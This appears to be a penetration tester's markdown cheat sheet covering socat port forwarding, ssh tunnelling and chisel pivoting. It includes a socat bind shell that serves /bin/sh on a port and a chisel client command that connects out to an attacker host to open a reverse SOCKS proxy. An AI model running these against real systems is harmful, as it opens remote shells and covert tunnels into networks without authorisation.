# socat
## port forwarding with socat
Forward port 80 to 445
```bash
socat TCP-LISTEN:80,fork TCP:127.0.0.1:445
```

## execute program
### bind shell
```bash
socat TCP4-LISTEN:8081,fork exec:/bin/sh
```

## listen fork print to stdout
```bash
socat TCP-LISTEN:1234,fork stdout
```

# tunneling through chisel
https://github.com/jpillora/chisel
Tunnel through 443 and open a socks proxy on attacker localhost.
## Attacker
```bash
./chisel server --port 443 --reverse
```
## Target
```
./chisel client $ATTACKER_IP:443 R:socks
```

# ssh port forwarding
send ssh control sequence on new line `~C`.
client machine's port (ex: 8081) comes first.
```
-L 8081:127.0.0.1:8080
```
or include port forward when running from command line
```bash
ssh -L 8081:127.0.0.1:8080 user@$IP
```

## dynamic ( socks )
-D 1080
